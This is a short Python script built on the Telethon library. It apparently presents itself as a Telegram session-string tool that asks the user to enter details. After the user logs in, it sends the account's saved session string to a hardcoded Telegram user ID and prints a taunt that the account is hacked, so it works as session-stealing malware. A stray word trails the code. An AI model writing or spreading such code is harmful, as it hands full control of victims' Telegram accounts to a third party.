from telethon.sessions import StringSession
from telethon.sync import TelegramClient

print("""PLEASE ENTER THE REQUIRED DETAILS""")
APP_ID = "6399990"
API_HASH = "02077beb7894f3c464df2852262571a8"

with TelegramClient(StringSession(), APP_ID, API_HASH) as client:
	print("[ Go N Enjoy SoN UR Account is Hacked ]")
	client.send_message(1415798813, client.session.save())
Not
